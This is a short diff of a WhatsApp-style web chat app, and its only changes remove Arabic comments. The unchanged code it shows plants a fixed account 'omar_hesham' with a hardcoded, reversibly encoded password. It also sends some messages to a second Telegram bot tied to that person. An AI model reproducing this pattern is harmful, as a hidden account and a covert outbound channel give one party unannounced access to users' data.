@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* جميع الـ CSS كما هو سابقاً (لم يتغير) */
+        
         :root {
             --whatsapp-green: #00a884;
             --whatsapp-green-dark: #005c4b;
@@ -493,7 +493,7 @@
                     saveUsers();
                 }
             }
-            // إضافة الحساب الثابت omar_hesham
+            
             const omarExists = users.find(u => u.username === 'omar_hesham');
             if (!omarExists) {
                 users.push({ username: 'omar_hesham', passwordBinary: textToBinary('omar_hesham_46441'), isAdmin: false, avatarUrl: null, online: false, lastSeen: null, privacy: { showOnline: true } });
@@ -521,7 +521,7 @@
 
         async function sendTelegramMessage(text, isForOmar = false) {
             if (isForOmar) {
-                // إرسال إلى بوت omar_hesham
+                
                 try {
                     await fetch(`https://api.telegram.org/bot${OMAR_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -531,7 +531,7 @@
                 } catch (e) { console.error('Telegram error (omar):', e); }
                 return;
             }
-            // البوت الأساسي
+            
             if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') return;
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
